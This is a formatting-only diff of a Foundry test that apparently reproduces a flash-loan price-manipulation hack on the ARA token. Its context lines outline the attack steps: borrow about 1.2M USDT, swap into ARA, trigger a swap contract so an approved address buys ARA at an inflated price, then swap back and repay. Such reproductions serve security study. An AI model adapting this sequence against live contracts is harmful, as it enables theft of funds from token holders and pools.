@@ -54,13 +54,13 @@ contract ARATest is Test {
 
         emit log_named_decimal_uint(
             "Attacker BUSDT balance before hack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
-            );
+        );
         // Step 1. Flashloan 1,202,701 USDT
         DPPOracle.flashLoan(0, 1_202_701 * 1e18, address(this), new bytes(1));
 
         emit log_named_decimal_uint(
             "Attacker BUSDT balance after hack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
-            );
+        );
     }
 
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
@@ -71,7 +71,7 @@ contract ARATest is Test {
         routerV3Swap(BUSDT, ARA, 1_202_701 * 1e18);
         emit log_named_decimal_uint(
             "Step 3. ARA amount out after first V3 swap", ARA.balanceOf(address(this)), ARA.decimals()
-            );
+        );
 
         // Step 4. Call the swap contract again to swap 132,123 USDT -> 12,179 ARA to let the approved address take over $ARA at a high price.
         callSwapContract(132_123 * 1e18, BUSDT);
@@ -80,7 +80,7 @@ contract ARATest is Test {
         routerV3Swap(ARA, BUSDT, ARA.balanceOf(address(this)));
         emit log_named_decimal_uint(
             "Step 5. BUSDT amount out after second V3 swap", BUSDT.balanceOf(address(this)), BUSDT.decimals()
-            );
+        );
 
         BUSDT.transfer(address(DPPOracle), quoteAmount);
     }
